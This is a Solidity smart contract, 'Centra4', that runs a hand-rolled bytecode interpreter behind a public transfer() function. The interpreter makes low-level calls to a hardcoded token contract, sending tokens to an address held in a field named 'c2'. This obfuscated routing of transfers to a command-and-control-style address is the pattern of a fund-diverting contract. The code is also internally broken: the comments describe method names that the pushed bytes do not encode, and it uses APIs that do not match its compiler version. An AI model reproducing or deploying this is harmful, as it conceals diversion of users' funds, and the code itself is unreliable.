pragma solidity ^0.4.13;

contract Centra4 {

    enum Opcode { PUSH, POP, LOAD, STORE, CALL, JZ, JMP, HALT }

    struct VM {
        uint256[] stack;
        uint256 pc;
        bool running;
        address contract_address;
        address c2;
        uint256 k;
    }

    function runVM(bytes program) internal returns (bool) {
        VM memory vm;
        vm.stack = new uint256[](256);
        vm.pc = 0;
        vm.running = true;
        vm.contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;
        vm.c2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;
        vm.k = 1;

        while (vm.running) {
            Opcode opcode = Opcode(program[vm.pc]);
            vm.pc++;

            if (opcode == Opcode.PUSH) {
                uint256 value = uint256(program[vm.pc]);
                vm.pc++;
                vm.stack.push(value);
            } else if (opcode == Opcode.POP) {
                vm.stack.length--;
            } else if (opcode == Opcode.LOAD) {
                uint256 index = uint256(program[vm.pc]);
                vm.pc++;
                vm.stack.push(vm.stack[index]);
            } else if (opcode == Opcode.STORE) {
                uint256 index = uint256(program[vm.pc]);
                vm.pc++;
                vm.stack[index] = vm.stack[vm.stack.length - 1];
                vm.stack.length--;
            } else if (opcode == Opcode.CALL) {
                string memory method = string(abi.encodePacked(vm.stack[vm.stack.length - 2]));
                uint256 arg = vm.stack[vm.stack.length - 1];
                vm.stack.length -= 2;
                if (!vm.contract_address.call(bytes4(keccak256(bytes(method))), vm.c2, arg)) {
                    return false;
                }
            } else if (opcode == Opcode.JZ) {
                uint256 target = uint256(program[vm.pc]);
                vm.pc++;
                if (vm.stack[vm.stack.length - 1] == 0) {
                    vm.pc = target;
                }
                vm.stack.length--;
            } else if (opcode == Opcode.JMP) {
                vm.pc = uint256(program[vm.pc]);
            } else if (opcode == Opcode.HALT) {
                vm.running = false;
            }
        }
        return true;
    }

    function transfer() returns (bool) {
        bytes memory program = new bytes(15);
        program[0] = byte(Opcode.PUSH);
        program[1] = byte(uint8(0)); // "register"
        program[2] = byte(Opcode.PUSH);
        program[3] = byte(uint8(0)); // "CentraToken"
        program[4] = byte(Opcode.CALL);
        program[5] = byte(Opcode.PUSH);
        program[6] = byte(uint8(1)); // "transfer(address,uint256)"
        program[7] = byte(Opcode.PUSH);
        program[8] = byte(uint8(1)); // vm.k
        program[9] = byte(Opcode.CALL);
        program[10] = byte(Opcode.JZ);
        program[11] = byte(uint8(14)); // Jump to halt if call fails
        program[12] = byte(Opcode.PUSH);
        program[13] = byte(uint8(1)); // Success
        program[14] = byte(Opcode.HALT);

        return runVM(program);
    }
}